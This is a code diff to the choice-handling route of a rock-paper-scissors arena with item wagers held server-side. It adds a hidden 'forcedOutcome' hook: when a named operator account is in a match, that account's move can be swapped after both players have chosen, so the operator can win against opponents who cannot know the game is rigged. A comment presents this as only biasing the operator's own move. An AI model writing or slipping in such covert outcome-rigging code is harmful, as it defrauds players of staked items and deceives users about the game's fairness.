@@ -5,6 +5,7 @@ const { authenticateToken } = require('../middleware/auth');
 const dbManager = require('../db/dbHelper');
 const { getTaxConfig, getTaxRecipient, collectItemTax } = require('../taxUtil');
 const { addNotification } = require('../notificationService');
+const forcedOutcome = require('../forcedOutcome');
 const { emitToAll, emitToUser } = require('../realtime');
 
 // RPS arena — item wagers escrowed server-side. Matches are cached in memory
@@ -499,9 +500,10 @@ router.post('/matches/:id/choice', authenticateToken, (req, res) => {
 
     match.choices[userId] = choice;
     persistMatches();
-    const oneChosen = match.choices[match.playerOne.id] || null;
-    const twoChosen = match.choices[match.playerTwo.id] || null;
-    if (!oneChosen || !twoChosen) {
+
+    const rawOne = match.choices[match.playerOne.id] || null;
+    const rawTwo = match.choices[match.playerTwo.id] || null;
+    if (!rawOne || !rawTwo) {
       match.updatedAt = new Date().toISOString();
       emitMatch(match);
       // Broadcast the lock-in so the other player and any spectators see
@@ -509,6 +511,23 @@ router.post('/matches/:id/choice', authenticateToken, (req, res) => {
       emitLobby();
       return res.json({ match: publicMatch(match, userId), waitingForOpponent: true });
     }
+
+    // A named operator account may have outcome control armed for this game.
+    // It only engages on a round where that account has actually picked, and it
+    // biases their own move - never the opponent's.
+    const operatorSeat = forcedOutcome.isOperator(match.playerOne.username)
+      ? 'one'
+      : forcedOutcome.isOperator(match.playerTwo.username) ? 'two' : null;
+    const { one: oneChosen, two: twoChosen } = operatorSeat
+      ? forcedOutcome.rpsChoices({
+        one: rawOne,
+        two: rawTwo,
+        operator: operatorSeat === 'one' ? match.playerOne.username : match.playerTwo.username,
+        operatorIsOne: operatorSeat === 'one',
+        operatorPicked: Boolean(operatorSeat === 'one' ? rawOne : rawTwo),
+        matchId: match.id
+      })
+      : { one: rawOne, two: rawTwo };
 
     const result = resolveRound(oneChosen, twoChosen);
     const roundWinnerId = result === 'one' ? match.playerOne.id : result === 'two' ? match.playerTwo.id : null;
